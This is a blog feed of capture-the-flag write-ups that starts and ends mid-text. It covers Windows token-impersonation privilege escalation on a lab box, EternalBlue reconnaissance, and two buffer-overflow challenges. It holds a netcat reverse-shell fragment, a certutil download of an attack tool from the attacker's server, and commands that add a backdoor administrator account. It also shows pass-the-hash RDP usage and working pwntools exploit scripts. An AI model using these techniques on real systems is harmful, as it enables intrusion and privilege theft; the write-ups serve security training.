IP\u0026gt; \u0026lt;attacker's port\u0026gt; -e cmd.exe\nPriv Esc Since we have access to the target machine, we need to escalate the priv. I am signed in as alfred\\bruce right now. This module mentions token impersonation to gain system access!\nToken Impersonation tags: #token-impersonation, #LSASS, #impersonation-token\nWindows uses tokens to ensure that accounts have the right privileges to carry out particular actions. Account tokens are assigned to an account when users log in or are authenticated. This is usually done by LSASS.exe (think of this as an authentication process).\nThis access token consists of - reference:\nUsers SIDs (Security Identifier) Group SIDs Privileges There are two types of access tokens:\nPrimary access tokens: those associated with a user account that are generated on log on Impersonation tokens: these allow a particular process (or thread in a process) to gain access to resources using the token of another (user/client) process For an impersonation token, there are different levels:\nSecurityAnonymous: current user/client cannot impersonate another user/client SecurityIdentification: current user/client can get the identity and privileges of a client but cannot impersonate the client SecurityImpersonation: current user/client can impersonate the client\u0026rsquo;s security context on the local system SecurityDelegation: current user/client can impersonate the client\u0026rsquo;s security context on a remote system Where the security context is a data structure that contains users\u0026rsquo; relevant security information.\nThe privileges of an account (which are either given to the account when created or inherited from a group) allow a user to carry out particular actions. SeImpersonatePrivilege SeAssignPrimaryPrivilege SeTcbPrivilege SeBackupPrivilege SeRestorePrivilege SeCreateTokenPrivilege SeLoadDriverPrivilege SeTakeOwnershipPrivilege SeDebugPrivilege This reference talks more about this - link\nIf we type whoami /priv, it shows:\nPS C:\\Program Files (x86)\\Jenkins\\workspace\u0026gt; whoami /priv PRIVILEGES INFORMATION ---------------------- Privilege Name Description State =============================== ========================================= ======== SeIncreaseQuotaPrivilege Adjust memory quotas for a process Disabled SeSecurityPrivilege Manage auditing and security log Disabled SeTakeOwnershipPrivilege Take ownership of files or other objects Disabled SeLoadDriverPrivilege Load and unload device drivers Disabled SeSystemProfilePrivilege Profile system performance Disabled SeSystemtimePrivilege Change the system time Disabled SeProfileSingleProcessPrivilege Profile single process Disabled SeIncreaseBasePriorityPrivilege Increase scheduling priority Disabled SeCreatePagefilePrivilege Create a pagefile Disabled SeBackupPrivilege Back up files and directories Disabled SeRestorePrivilege Restore files and directories Disabled SeShutdownPrivilege Shut down the system Disabled SeDebugPrivilege Debug programs Enabled SeSystemEnvironmentPrivilege Modify firmware environment values Disabled SeChangeNotifyPrivilege Bypass traverse checking Enabled SeRemoteShutdownPrivilege Force shutdown from a remote system Disabled SeUndockPrivilege Remove computer from docking station Disabled SeManageVolumePrivilege Perform volume maintenance tasks Disabled SeImpersonatePrivilege Impersonate a client after authentication Enabled SeCreateGlobalPrivilege Create global objects Enabled SeIncreaseWorkingSetPrivilege Increase a process working set Disabled SeTimeZonePrivilege Change the time zone Disabled SeCreateSymbolicLinkPrivilege Create symbolic links Disabled We can see that two privileges SeDebugPrivilege and SeImpersonatePrivilege are enabled. To exploit this, we will use incognito.exe tool. Here is the link to the tool (the compiled binary link is here.\nAfter downloading the executable file, let\u0026rsquo;s move that onto the target machine by using certutil.exe -urlcache -split -f \u0026quot;http://10.10.45.124:8000/incognito.exe\u0026quot;. This will download the file into the current directory that we are in.\nNow we are ready to run the tool. We can run the tool with list_tokens -g argument to see which tokens are available to use. - .\\incognito.exe list_tokens -g: to get the groups\nThe result shows:\nPS C:\\users\\bruce\\desktop\u0026gt; .\\incognito.exe list_tokens -g [-] WARNING: Not running as SYSTEM. Not all tokens will be available. [*] Enumerating tokens [*] Listing unique users found Delegation Tokens Available ============================================ BUILTIN\\Administrators BUILTIN\\Users NT AUTHORITY\\Authenticated Users NT AUTHORITY\\NTLM Authentication NT AUTHORITY\\SERVICE NT AUTHORITY\\This Organization NT AUTHORITY\\WRITE RESTRICTED NT SERVICE\\AppHostSvc NT SERVICE\\AudioEndpointBuilder NT SERVICE\\BFE NT SERVICE\\CertPropSvc NT SERVICE\\CscService NT SERVICE\\Dnscache NT SERVICE\\eventlog NT SERVICE\\EventSystem NT SERVICE\\FDResPub NT SERVICE\\iphlpsvc NT SERVICE\\LanmanServer NT SERVICE\\MMCSS NT SERVICE\\PcaSvc NT SERVICE\\PlugPlay NT SERVICE\\RpcEptMapper NT SERVICE\\Schedule NT SERVICE\\SENS NT SERVICE\\SessionEnv NT SERVICE\\Spooler NT SERVICE\\TrkWks NT SERVICE\\TrustedInstaller NT SERVICE\\UmRdpService NT SERVICE\\UxSms NT SERVICE\\Winmgmt NT SERVICE\\WSearch NT SERVICE\\wuauserv Impersonation Tokens Available ============================================ NT AUTHORITY\\NETWORK NT SERVICE\\AudioSrv NT SERVICE\\DcomLaunch NT SERVICE\\Dhcp NT SERVICE\\DPS NT SERVICE\\lmhosts NT SERVICE\\MpsSvc NT SERVICE\\PolicyAgent NT SERVICE\\Power NT SERVICE\\ShellHWDetection NT SERVICE\\wscsvc Administrative Privileges Available ============================================ SeAssignPrimaryTokenPrivilege SeCreateTokenPrivilege SeTcbPrivilege SeTakeOwnershipPrivilege SeBackupPrivilege SeRestorePrivilege SeDebugPrivilege SeImpersonatePrivilege SeRelabelPrivilege SeLoadDriverPrivilege At the top of the result, we can see BUILTIN\\Administrators.\nWe can also run this command incognito.exe list_tokens -u to see which users are available as well:\nPS C:\\users\\bruce\\desktop\u0026gt; .\\incognito.exe list_tokens -u [-] WARNING: Not running as SYSTEM. Not all tokens will be available. [*] Enumerating tokens [*] Listing unique users found Delegation Tokens Available ============================================ alfred\\bruce NT AUTHORITY\\IUSR NT AUTHORITY\\LOCAL SERVICE NT AUTHORITY\\NETWORK SERVICE NT AUTHORITY\\SYSTEM Impersonation Tokens Available ============================================ NT AUTHORITY\\ANONYMOUS LOGON Administrative Privileges Available ============================================ SeAssignPrimaryTokenPrivilege SeCreateTokenPrivilege SeTcbPrivilege SeTakeOwnershipPrivilege SeBackupPrivilege SeRestorePrivilege SeDebugPrivilege SeImpersonatePrivilege SeRelabelPrivilege SeLoadDriverPrivilege If the account has been granted SeDebugPrivilege and SeImpersonatePrivilege, incognito will automatically enable these privileges and use them to gain access to all tokens and escalate to the SYSTEM. Knowing that, we will create a user on the system by running powershell.exe \u0026lt;path_to_incognito.exe\u0026gt; add_user \u0026lt;username\u0026gt; \u0026lt;password\u0026gt;\nIf you run net user jay, you see:\nPS C:\\users\\bruce\\desktop\u0026gt; powershell.exe .\\incognito.exe add_user jay 123 [-] WARNING: Not running as SYSTEM. Not all tokens will be available. [*] Enumerating tokens [*] Attempting to add user jay to host 127.0.0.1 [+] Successfully added user PS C:\\users\\bruce\\desktop\u0026gt; net user jay User name jay Full Name jay Comment User\u0026#39;s comment Country code 000 (System Default) Account active Yes Account expires Never Password last set 6/20/2023 5:42:31 PM Password expires 8/1/2023 5:42:31 PM Password changeable 6/20/2023 5:42:31 PM Password required Yes User may change password Yes Workstations allowed All Logon script User profile Home directory Last logon Never Logon hours allowed All Local Group Memberships Global Group memberships *None The command completed successfully. Now we need to add this user to the administrator group with the following command:\npowershell.exe \u0026lt;path_to_incognito.exe\u0026gt; add_localgroup_user \u0026lt;group\u0026gt; \u0026lt;user\u0026gt; - in our casae, powershell.exe \u0026lt;path_to_incognito.exe\u0026gt; add_localgroup_user administrators jay\nPS C:\\users\\bruce\\desktop\u0026gt; net user jay User name jay Full Name jay Comment User\u0026#39;s comment Country code 000 (System Default) Account active Yes Account expires Never Password last set 6/20/2023 5:42:31 PM Password expires 8/1/2023 5:42:31 PM Password changeable 6/20/2023 5:42:31 PM Password required Yes User may change password Yes Workstations allowed All Logon script User profile Home directory Last logon 6/20/2023 5:52:45 PM Logon hours allowed All Local Group Memberships *Administrators Global Group memberships *None The command completed successfully. Once it says the command ran successfully, we can use the tools below to logon to the system (you can see that the Local Group Memberships is now \u0026lsquo;Administrators\u0026rsquo;).\nSince port 3389 is open (RDP), we can use rdesktop or xfreerdp to try to log on to the system that we just created.\nUsage from https://book.hacktricks.xyz/network-services-pentesting/pentesting-rdp rdesktop -u \u0026lt;username\u0026gt; \u0026lt;IP\u0026gt; rdesktop -d \u0026lt;domain\u0026gt; -u \u0026lt;username\u0026gt; -p \u0026lt;password\u0026gt; \u0026lt;IP\u0026gt; xfreerdp [/d:domain] /u:\u0026lt;username\u0026gt; /p:\u0026lt;password\u0026gt; /v:\u0026lt;IP\u0026gt; xfreerdp [/d:domain] /u:\u0026lt;username\u0026gt; /pth:\u0026lt;hash\u0026gt; /v:\u0026lt;IP\u0026gt; #Pass the hash Once you are in, you can once again run net user jay to see the rights the account has. To get the root flag, I had to use the GUI to get to the directory so that I can keep continuing with the privilege that I had (I could not do it through the terminal - or I just did not know how to).\nIt was very interesting to know/learn about the token impersonation in the Windows system.\n","permalink":"https://joonkim0625.github.io/posts/2023-6-26-thm-alfred/","summary":"\u003ch2 id=\"challenge-alfred\"\u003eChallenge: Alfred\u003c/h2\u003e\n\u003cp\u003eThis box is about exploiting Jenkins (misconfiguration). Jenkins is an open\nsource \u003cstrong\u003econtinuous integration/continuous delivery and deployment (CI/CD)\u003c/strong\u003e\nautomation software DevOps tool written in the Java programming language. This\ntool is used to implement CI/CD workflows, called pipelines.\u003c/p\u003e\n\u003cp\u003eThis box introduces a tool called Nishang which is a framework and collection of\nscripts and payloads which enables usage of PowerShell for offensive security,\npenetration testing and red teaming.\u003c/p\u003e","title":"TryHackMe - Alfred"},{"content":"Challenge: Blue There wasn\u0026rsquo;t a description, so I ran nmap on the IP address that I was given:\nPORT STATE SERVICE VERSION 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 445/tcp open microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP) 49152/tcp open msrpc Microsoft Windows RPC 49153/tcp open msrpc Microsoft Windows RPC 49154/tcp open msrpc Microsoft Windows RPC 49155/tcp open msrpc Microsoft Windows RPC 49156/tcp open msrpc Microsoft Windows RPC 49157/tcp open msrpc Microsoft Windows RPC Service Info: Host: HARIS-PC; OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: | smb-security-mode: | account_used: guest | authentication_level: user | challenge_response: supported |_ message_signing: disabled (dangerous, but default) | smb2-time: | date: 2023-04-30T01:23:49 |_ start_date: 2023-04-30T01:19:21 | smb2-security-mode: | 210: |_ Message signing enabled but not required | smb-os-discovery: | OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1) | OS CPE: cpe:/o:microsoft:windows_7::sp1:professional | Computer name: haris-PC | NetBIOS computer name: HARIS-PC\\x00 | Workgroup: WORKGROUP\\x00 |_ System time: 2023-04-30T02:23:51+01:00 |_clock-skew: mean: -19m03s, deviation: 34m35s, median: 54s Port 135 was open, so I googled if there were any exploits regarding the msrpc service. I was able to find this article.\nAs mentioned in the article, MSRPC (or Microsoft Remote Procedure Call) is a protocol that uses the client-server model in order to allow one program to request service from a program on another computer without having to understand the details of that computer\u0026rsquo;s network.\nThis could be the vulnerability that I can use to attack the system, so I decided to jump on this first.\nPort 135 I couldn\u0026rsquo;t find any vulnerabilities regarding MSRPC.\nPort 139: NetBIOS According to the link above, NetBIOS stands for Network Basic Input Output System. And this is known as \u0026lsquo;NBT over IP\u0026rsquo;.\nPort 445: SMB According to the link, port 445 is \u0026lsquo;SMB over IP\u0026rsquo;. SMB stands for \u0026lsquo;Server Message Blocks\u0026rsquo;. This in modern language is also known as Common Internet File System.\nConclusion This room was about EternalBlue vulnerability - CVE-2017-0143. Resource Should be a simple exploitation after attempting to enumerate the SMB client to see if we can find anything useful. If not successful, then we can try to run nmap with existing scripts regarding smb such as smb-enum series. We can also use smb-vuln scripts to see if there are any vulnerabilities. The resource above provided this useful EternalBlue exploitation resource.\nFollow the direction then we will be able to launch the reverse shell.\n","permalink":"https://joonkim0625.github.io/posts/2023-4-29-hackthebox-blue/","summary":"\u003ch2 id=\"challenge-blue\"\u003eChallenge: Blue\u003c/h2\u003e\n\u003cp\u003eThere wasn\u0026rsquo;t a description, so I ran \u003ccode\u003enmap\u003c/code\u003e on the IP address that I was given:\u003c/p\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003ePORT      STATE SERVICE      VERSION\n135/tcp   open  msrpc        Microsoft Windows RPC\n139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn\n445/tcp   open  microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)\n49152/tcp open  msrpc        Microsoft Windows RPC\n49153/tcp open  msrpc        Microsoft Windows RPC\n49154/tcp open  msrpc        Microsoft Windows RPC\n49155/tcp open  msrpc        Microsoft Windows RPC\n49156/tcp open  msrpc        Microsoft Windows RPC\n49157/tcp open  msrpc        Microsoft Windows RPC\nService Info: Host: HARIS-PC; OS: Windows; CPE: cpe:/o:microsoft:windows\n\nHost script results:\n| smb-security-mode:\n|   account_used: guest\n|   authentication_level: user\n|   challenge_response: supported\n|_  message_signing: disabled (dangerous, but default)\n| smb2-time:\n|   date: 2023-04-30T01:23:49\n|_  start_date: 2023-04-30T01:19:21\n| smb2-security-mode:\n|   210:\n|_    Message signing enabled but not required\n| smb-os-discovery:\n|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)\n|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional\n|   Computer name: haris-PC\n|   NetBIOS computer name: HARIS-PC\\x00\n|   Workgroup: WORKGROUP\\x00\n|_  System time: 2023-04-30T02:23:51+01:00\n|_clock-skew: mean: -19m03s, deviation: 34m35s, median: 54s\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003ePort 135 was open, so I googled if there were any exploits regarding the msrpc\nservice. I was able to find this \u003ca href=\"https://book.hacktricks.xyz/network-services-pentesting/135-pentesting-msrpc\"\u003earticle\u003c/a\u003e.\u003c/p\u003e","title":"HackTheBox - Beginner Track: Blue"},{"content":"Description This is one of the challenges of the beginner track in HackTheBox.\nI was given a binary with no source code. This indicated that I would need to use Ghidra to look at the decompiled source code. First, some checks on the binary:\n─$ file ./vuln ./vuln: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=ab7f19bb67c16ae453d4959fba4e6841d930a6dd, for GNU/Linux 3.2.0, not stripped No defensive mechanisms are turned on for this challenge.\nThe main function:\nundefined4 main(void) { __gid_t __rgid; setvbuf(stdout,(char *)0x0,2,0); __rgid = getegid(); setresgid(__rgid,__rgid,__rgid); puts(\u0026#34;You know who are 0xDiablos: \u0026#34;); vuln(); return 0; } As we can see, it calls vuln():\nvoid vuln(void) { char local_bc [180]; gets(local_bc); puts(local_bc); return; } Very simple buffer overflow. Another interesting function was this flag():\nvoid flag(int param_1,int param_2) { char local_50 [64]; FILE *local_10; local_10 = fopen(\u0026#34;flag.txt\u0026#34;,\u0026#34;r\u0026#34;); if (local_10 != (FILE *)0x0) { fgets(local_50,0x40,local_10); if ((param_1 == L\u0026#39;\\xdeadbeef\u0026#39;) \u0026amp;\u0026amp; (param_2 == L\u0026#39;\\xc0ded00d\u0026#39;)) { printf(local_50); } return; } puts(\u0026#34;Hurry up and try in on server side.\u0026#34;); /* WARNING: Subroutine does not return */ exit(0); } So, as we redirect the control flow of the program to this function by overwriting the return address of vunl(), it looks like we will need to provide two arguments to print the flag.\nIn order to do that, we need to know this - X86 stores function arguments onto the stack whereas X86-64 stores them into registers. After watching this video , after overwriting the return address, we need to pad 4 bytes to account for the new stack frame\u0026rsquo;s return address. Then we need to provide two argumetns following the padding bytes. My exploit is as below:\nfrom pwn import * #p = process(\u0026#34;./vuln\u0026#34;) p = remote(\u0026#39;64.227.42.255\u0026#39;, 31142) winaddr = 0x080491e2 payload = b\u0026#34;A\u0026#34; * 188 payload += p32(winaddr) payload += b\u0026#34;A\u0026#34; * 4 # ret address for the winaddr payload += p32(0xdeadbeef) payload += p32(0xc0ded00d) p.sendline(payload) p.interactive() Since there is no PIE, we can easily get the address of flag(). Then 188 bytes plus the address to the flag function plus the padding of 4 bytes plus the two arguments for the flag function. Once you run the script:\n└─$ python3 sol.py [+] Opening connection to 64.227.42.255 on port 31142: Done [*] Switching to interactive mode You know who are 0xDiablos: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\\xd0\\xde\\xc0AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\\xe2\\x9AAAAﾭ\\xde HTB{******************}$ This was an easy and a very basic buffer overflow challenge in X86 environment.\n","permalink":"https://joonkim0625.github.io/posts/2023-3-13-hackthebox-you-know-0xdiablos/","summary":"\u003ch2 id=\"description\"\u003eDescription\u003c/h2\u003e\n\u003cp\u003eThis is one of the challenges of the beginner track in HackTheBox.\u003c/p\u003e\n\u003cp\u003eI was given a binary with no source code. This indicated that I would need to\nuse Ghidra to look at the decompiled source code. First, some checks on the\nbinary:\u003c/p\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003e─$ file ./vuln\n./vuln: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=ab7f19bb67c16ae453d4959fba4e6841d930a6dd, for GNU/Linux 3.2.0, not stripped\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003eNo defensive mechanisms are turned on for this challenge.\u003c/p\u003e","title":"HackTheBox: You know 0xDiablos"},{"content":"Description I made a bot to automatically answer all of your questions.\nnc lac.tf 31180\nMy approach Again, the source code, its binary, and the Dockerfile were given. Looking at the sour code code:\n#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; int main(void) { setbuf(stdout, NULL); char input[64]; volatile int give_flag = 0; puts(\u0026#34;hi, how can i help?\u0026#34;); gets(input); if (strcmp(input, \u0026#34;give me the flag\u0026#34;) == 0) { puts(\u0026#34;lol no\u0026#34;); } else if (strcmp(input, \u0026#34;please give me the flag\u0026#34;) == 0) { puts(\u0026#34;no\u0026#34;); } else if (strcmp(input, \u0026#34;help, i have no idea how to solve this\u0026#34;) == 0) { puts(\u0026#34;L\u0026#34;); } else if (strcmp(input, \u0026#34;may i have the flag?\u0026#34;) == 0) { puts(\u0026#34;not with that attitude\u0026#34;); } else if (strcmp(input, \u0026#34;please please please give me the flag\u0026#34;) == 0) { puts(\u0026#34;i\u0026#39;ll consider it\u0026#34;); sleep(15); if (give_flag) { puts(\u0026#34;ok here\u0026#39;s your flag\u0026#34;); system(\u0026#34;cat flag.txt\u0026#34;); } else { puts(\u0026#34;no\u0026#34;); } } else { puts(\u0026#34;sorry, i didn\u0026#39;t understand your question\u0026#34;); exit(1); } } After looking at the source code, I noticed that there is a give_flag variable and a buffer that we can overflow since the user input is received with gets(). Unlike the previous challenge I worked on, give_flag variable would always be located after the buffer input so we won\u0026rsquo;t be able to modify the value of give_flag this time.\nI ran checksec on the binary:\nArch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) The NX bit is on but PIE is disabled. The immediate thought was to control the code flow of the program by overwriting the return address. How would we do this? I think looking at the result of objdump of the binary can be very helpful.\n0000000000401182 \u0026lt;main\u0026gt;: 401182: 55 push rbp 401183: 48 89 e5 mov rbp,rsp 401186: 48 83 ec 50 sub rsp,0x50 40118a: 48 8b 05 cf 2e 00 00 mov rax,QWORD PTR [rip+0x2ecf] # 404060 \u0026lt;stdout@GLIBC_2.2.5\u0026gt; 401191: be 00 00 00 00 mov esi,0x0 401196: 48 89 c7 mov rdi,rax 401199: e8 a2 fe ff ff call 401040 \u0026lt;setbuf@plt\u0026gt; 40119e: c7 45 bc 00 00 00 00 mov DWORD PTR [rbp-0x44],0x0 4011a5: 48 8d 3d 5c 0e 00 00 lea rdi,[rip+0xe5c] # 402008 \u0026lt;_IO_stdin_used+0x8\u0026gt; 4011ac: e8 7f fe ff ff call 401030 \u0026lt;puts@plt\u0026gt; 4011b1: 48 8d 45 c0 lea rax,[rbp-0x40] 4011b5: 48 89 c7 mov rdi,rax 4011b8: e8 b3 fe ff ff call 401070 \u0026lt;gets@plt\u0026gt; 4011bd: 48 8d 45 c0 lea rax,[rbp-0x40] 4011c1: 48 8d 35 54 0e 00 00 lea rsi,[rip+0xe54] # 40201c \u0026lt;_IO_stdin_used+0x1c\u0026gt; 4011c8: 48 89 c7 mov rdi,rax 4011cb: e8 90 fe ff ff call 401060 \u0026lt;strcmp@plt\u0026gt; 4011d0: 85 c0 test eax,eax 4011d2: 75 11 jne 4011e5 \u0026lt;main+0x63\u0026gt; 4011d4: 48 8d 3d 52 0e 00 00 lea rdi,[rip+0xe52] # 40202d \u0026lt;_IO_stdin_used+0x2d\u0026gt; 4011db: e8 50 fe ff ff call 401030 \u0026lt;puts@plt\u0026gt; 4011e0: e9 e7 00 00 00 jmp 4012cc \u0026lt;main+0x14a\u0026gt; 4011e5: 48 8d 45 c0 lea rax,[rbp-0x40] 4011e9: 48 8d 35 44 0e 00 00 lea rsi,[rip+0xe44] # 402034 \u0026lt;_IO_stdin_used+0x34\u0026gt; 4011f0: 48 89 c7 mov rdi,rax 4011f3: e8 68 fe ff ff call 401060 \u0026lt;strcmp@plt\u0026gt; 4011f8: 85 c0 test eax,eax 4011fa: 75 11 jne 40120d \u0026lt;main+0x8b\u0026gt; 4011fc: 48 8d 3d 49 0e 00 00 lea rdi,[rip+0xe49] # 40204c \u0026lt;_IO_stdin_used+0x4c\u0026gt; 401203: e8 28 fe ff ff call 401030 \u0026lt;puts@plt\u0026gt; 401208: e9 bf 00 00 00 jmp 4012cc \u0026lt;main+0x14a\u0026gt; 40120d: 48 8d 45 c0 lea rax,[rbp-0x40] 401211: 48 8d 35 38 0e 00 00 lea rsi,[rip+0xe38] # 402050 \u0026lt;_IO_stdin_used+0x50\u0026gt; 401218: 48 89 c7 mov rdi,rax 40121b: e8 40 fe ff ff call 401060 \u0026lt;strcmp@plt\u0026gt; 401220: 85 c0 test eax,eax 401222: 75 11 jne 401235 \u0026lt;main+0xb3\u0026gt; 401224: 48 8d 3d 4c 0e 00 00 lea rdi,[rip+0xe4c] # 402077 \u0026lt;_IO_stdin_used+0x77\u0026gt; 40122b: e8 00 fe ff ff call 401030 \u0026lt;puts@plt\u0026gt; 401230: e9 97 00 00 00 jmp 4012cc \u0026lt;main+0x14a\u0026gt; 401235: 48 8d 45 c0 lea rax,[rbp-0x40] 401239: 48 8d 35 39 0e 00 00 lea rsi,[rip+0xe39] # 402079 \u0026lt;_IO_stdin_used+0x79\u0026gt; 401240: 48 89 c7 mov rdi,rax 401243: e8 18 fe ff ff call 401060 \u0026lt;strcmp@plt\u0026gt; 401248: 85 c0 test eax,eax 40124a: 75 0e jne 40125a \u0026lt;main+0xd8\u0026gt; 40124c: 48 8d 3d 3b 0e 00 00 lea rdi,[rip+0xe3b] # 40208e \u0026lt;_IO_stdin_used+0x8e\u0026gt; 401253: e8 d8 fd ff ff call 401030 \u0026lt;puts@plt\u0026gt; 401258: eb 72 jmp 4012cc \u0026lt;main+0x14a\u0026gt; 40125a: 48 8d 45 c0 lea rax,[rbp-0x40] 40125e: 48 8d 35 43 0e 00 00 lea rsi,[rip+0xe43] # 4020a8 \u0026lt;_IO_stdin_used+0xa8\u0026gt; 401265: 48 89 c7 mov rdi,rax 401268: e8 f3 fd ff ff call 401060 \u0026lt;strcmp@plt\u0026gt; 40126d: 85 c0 test eax,eax 40126f: 75 45 jne 4012b6 \u0026lt;main+0x134\u0026gt; 401271: 48 8d 3d 56 0e 00 00 lea rdi,[rip+0xe56] # 4020ce \u0026lt;_IO_stdin_used+0xce\u0026gt; 401278: e8 b3 fd ff ff call 401030 \u0026lt;puts@plt\u0026gt; 40127d: bf 0f 00 00 00 mov edi,0xf 401282: e8 09 fe ff ff call 401090 \u0026lt;sleep@plt\u0026gt; 401287: 8b 45 bc mov eax,DWORD PTR [rbp-0x44] 40128a: 85 c0 test eax,eax 40128c: 74 1a je 4012a8 \u0026lt;main+0x126\u0026gt; 40128e: 48 8d 3d 4a 0e 00 00 lea rdi,[rip+0xe4a] # 4020df \u0026lt;_IO_stdin_used+0xdf\u0026gt; 401295: e8 96 fd ff ff call 401030 \u0026lt;puts@plt\u0026gt; 40129a: 48 8d 3d 52 0e 00 00 lea rdi,[rip+0xe52] # 4020f3 \u0026lt;_IO_stdin_used+0xf3\u0026gt; 4012a1: e8 aa fd ff ff call 401050 \u0026lt;system@plt\u0026gt; 4012a6: eb 24 jmp 4012cc \u0026lt;main+0x14a\u0026gt; 4012a8: 48 8d 3d 9d 0d 00 00 lea rdi,[rip+0xd9d] # 40204c \u0026lt;_IO_stdin_used+0x4c\u0026gt; 4012af: e8 7c fd ff ff call 401030 \u0026lt;puts@plt\u0026gt; 4012b4: eb 16 jmp 4012cc \u0026lt;main+0x14a\u0026gt; 4012b6: 48 8d 3d 43 0e 00 00 lea rdi,[rip+0xe43] # 402100 \u0026lt;_IO_stdin_used+0x100\u0026gt; 4012bd: e8 6e fd ff ff call 401030 \u0026lt;puts@plt\u0026gt; 4012c2: bf 01 00 00 00 mov edi,0x1 4012c7: e8 b4 fd ff ff call 401080 \u0026lt;exit@plt\u0026gt; 4012cc: b8 00 00 00 00 mov eax,0x0 4012d1: c9 leave 4012d2: c3 ret 4012d3: 66 2e 0f 1f 84 00 00 cs nop WORD PTR [rax+rax*1+0x0] 4012da: 00 00 00 4012dd: 0f 1f 00 nop DWORD PTR [rax] This is objdump result of main(). If you compare this to the main function written in C, you can see that all those calls to strcmp@plt. And what we need to be aware is after puts call within the strcmp scope:\n4011cb: e8 90 fe ff ff call 401060 \u0026lt;strcmp@plt\u0026gt; 4011d0: 85 c0 test eax,eax 4011d2: 75 11 jne 4011e5 \u0026lt;main+0x63\u0026gt; 4011d4: 48 8d 3d 52 0e 00 00 lea rdi,[rip+0xe52] # 40202d \u0026lt;_IO_stdin_used+0x2d\u0026gt; 4011db: e8 50 fe ff ff call 401030 \u0026lt;puts@plt\u0026gt; 4011e0: e9 e7 00 00 00 jmp 4012cc \u0026lt;main+0x14a\u0026gt; we can see that the code flow jumps to 4012cc which is at the end of the main function. If we take a look at 4012cc:\n4012cc: b8 00 00 00 00 mov eax,0x0 4012d1: c9 leave 4012d2: c3 ret we can see that there is a ret instruction that jumps to __libc_start_call_main (so the main function also returns to somewhere!). So, if we can jump into one of the strcmp scope and overflow the buffer with the address of our control, I think we can get the flag. Since PIE is disabled meaning the program will be loaded into the exact same location every time, we can maybe able to make the control flow go to where the system(\u0026quot;cat flga.txt\u0026quot;); is!\nBut, the question is how are we going to overwrite the return address? Because if we pass any inputs other than those ones that are being compared to some strings, the code flow will end up hitting exit(1) and this terminates the program immediately without returning to anywhere. So we want to make sure we can jump into one of the if cases so the code flow ends up at 4012cc. If you were thinking passing a big chunk of input to the program, it will always hit the last else part that will lead us to exit(1). If we understand how strcmp works, we can easily pass the input of our choice and overwrite the buffer.\nstrcmp compares two strings that are passed to it. How it works is it will compare each character from the two strings. If it finds a match, it returns 0. If not, then it will return some other integer values based on the result of the integer comparison of the two characters. Let\u0026rsquo;s take a look at an input please please please give me the flagaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.\nIf you pass this input to the program, you will get:\n─$ python3 -c \u0026#39;print(\u0026#34;please please please give me the flag\u0026#34; + \u0026#34;a\u0026#34; * 100)\u0026#39; | ./bot hi, how can i help? sorry, i didn\u0026#39;t understand your question As you can see, it fell into the exit(1). The reason is the data we passed in did not separate between please please ... the flag and the as that I sent in to see if the return address gets overwritten. strcmp stops reading when it sees a NULL byte! Using this characteristic of strcmp, we can build a payload that is\n└─$ python3 -c \u0026#39;print(\u0026#34;please give me the flag\u0026#34; + \u0026#34;\\x00\u0026#34; + \u0026#34;a\u0026#34; * 100)\u0026#39; please give me the flagaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa It may not be apparent from the string created but I inserted a null byte between the first chunk of string and the bunch of \u0026lsquo;a\u0026rsquo;s. This will allow strcmp to compare the string up to \\x00 and still the buffer will be overwritten with a bunch of \u0026lsquo;a\u0026rsquo;s.\nWe will create a file that contains the payload above and pass it into GDB to see if the payload overwrites the ret address. I modified the input file - replaced \u0026lsquo;a\u0026rsquo;s with the cyclic of 128 chars.\n// there is a null byte after \u0026#39;flag\u0026#39; please give me the flagaaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaa So, I write the above payload to a file and feed it when running bot in GDB. The result I got when the instruction was at 0x4012d2 \u0026lt;main+336\u0026gt; ret, 0x7fffffffdd88: 0x6161616161616861. If we find this pattern, we get 55 (meaning the distance from the beginning of the buffer to right before the ret address is 55 bytes).\nKnowing this, we can prepare a python script that will do the rest for us.\nfrom pwn import * p = remote(\u0026#34;lac.tf\u0026#34;, \u0026#34;31180\u0026#34;) payload = b\u0026#34;give me the flag\u0026#34; payload += b\u0026#34;\\x00\u0026#34; payload += b\u0026#34;A\u0026#34; * 55 # this is the address to an instruction right before the system call payload += p64(0x40129a) p.sendline(payload) p.interactive() As you can see, the payload starts with \u0026ldquo;give me the flag\u0026rdquo; string followed by a null byte so strcmp can actually compare the two strings. After that, I filled 55 bytes with A\u0026rsquo;s and then added the address of the instruction that I want the code flow to go to. If we run this script, we would get:\n└─$ python3 sol.py [+] 